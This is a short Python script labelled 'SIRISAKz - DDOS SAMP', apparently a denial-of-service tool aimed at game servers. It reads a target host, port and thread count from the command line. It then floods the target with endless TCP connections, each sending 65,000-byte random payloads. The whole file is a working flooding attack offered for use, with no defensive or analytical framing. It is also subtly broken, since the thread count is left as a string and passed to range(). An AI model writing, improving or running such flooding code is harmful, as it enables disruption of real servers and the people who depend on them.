import random
import socket
import threading
import sys
host = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])
method = str(sys.argv[4])
print("")
print("")
print(""" 
	| SIRISAKz - DDOS SAMP | 
""")
print("")
print("""
	  - TCP FLOOD ATTACK -
""")
print("")
print("")
ip = host
times = time
threads = method

def tcpsirisakz():
	data = random._urandom(65000)
	i = ("| SIRISAKz TCP - ATTACK | - ")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" SENT !")
		except:
			s.close()
			print("Error !!")

for y in range(threads):
		th = threading.Thread(target = tcpsirisakz)
		th.start()
